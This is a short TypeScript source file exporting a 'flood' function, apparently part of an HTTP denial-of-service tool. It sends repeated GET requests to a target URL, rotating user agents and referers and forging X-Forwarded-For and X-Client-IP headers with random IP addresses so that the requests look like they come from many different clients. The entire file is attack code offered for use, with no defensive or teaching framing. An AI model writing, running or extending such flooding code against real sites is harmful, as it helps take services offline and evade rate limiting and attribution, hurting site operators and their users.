import { USER_AGENTS, REFERERS } from "@/lib/config"

function randomChoice<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)]
}

function randIp(): string {
  return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
}

export async function flood(
  url: string,
  rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const target = url.startsWith("http") ? url : `http://${url}`
  const actualRpc = Math.min(rpc, 5)

  for (let i = 0; i < actualRpc; i++) {
    try {
      await fetch(target, {
        method: "GET",
        headers: {
          "User-Agent": randomChoice(USER_AGENTS),
          "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
          "Referer": randomChoice(REFERERS),
          "X-Forwarded-For": randIp(),
          "X-Client-IP": randIp(),
          "Connection": "keep-alive",
        },
        redirect: "manual",
      })
      onStats(1, 400)
    } catch {}
  }
}
